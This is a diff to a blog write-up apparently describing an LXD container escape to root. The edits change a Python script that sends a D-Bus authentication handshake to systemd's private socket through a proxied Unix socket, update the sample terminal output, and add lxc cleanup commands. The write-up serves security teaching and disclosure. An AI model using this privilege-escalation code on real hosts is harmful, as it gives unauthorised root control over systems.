@@ -288,8 +288,6 @@ Take this short python script:
 
 """
 Sends initial auth stream to systemd's private socket
-
-As demonstrated in https://initblog.com/2019/lxd-root/
 """
 
 import socket
@@ -299,24 +297,22 @@ AUTH = u'\0AUTH EXTERNAL 30\r\nNEGOTIATE_UNIX_FD\r\nBEGIN\r\n'
 
 def send_msg(sock_name, msg):
     """Send raw message to an AF_UNIX socket"""
-
-    # Connect to the defined socket
     client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
     client_sock.connect(sock_name)
 
-    # Send the message
-    client_sock.sendall(AUTH.encode('latin-1'))
-
-    # If there is a reply, print it to console
-    reply = client_sock.recv(8192).decode("latin-1")
-    if reply:
+    try:
+        client_sock.sendall(AUTH.encode('latin-1'))
+        reply = client_sock.recv(8192).decode("latin-1")
         print(reply)
+    except:
+        print("[!] Connection reset...")
 
 def main():
     send_msg(sys.argv[1], AUTH)
 
 if __name__ == '__main__':
     main()
+
 ```
 
 This is designed to connect to a socket specified as the first argument and then to send the first message we observed in the output of `strace`.
@@ -350,7 +346,7 @@ Alright, now let let's run the python script again to see if we can now talk to 
 
 ```
 lowpriv@server:~$ ./systemd_auth.py /tmp/host_sock
-OK a1cde28f7bdd46f283f348654d7fa07f
+OK 9e46264bb91045f19797dd7b1d70f513
 AGREE_UNIX_FD
 ```
 
@@ -359,6 +355,17 @@ Excellent! We are now speaking directly to the host's systemd service as if we a
 From here, we can continue to analyze `strace` output to build the `systemctl` commands we want to run. While `strace` shows the message data broken into fragments, we can actually piece them together into singe variables in a Python script and throw them at the socket.
 
 You can review the source code of lxd_rootv2.py to fully understand how this is implemented.
+
+If you followed along in this blog, you can do a bit of cleanup by running the following commands
+
+```
+lxc config device remove falcor proxy_sock
+lxc config device remove falcor container_sock
+lxc config device remove falcor host_sock
+rm /tmp/host_sock
+rm /tmp/proxy_sock
+rm /tmp/echo.sock
+```
 
 ## Exploit Workflow
 lxd_rootv2.py essentially does the following:
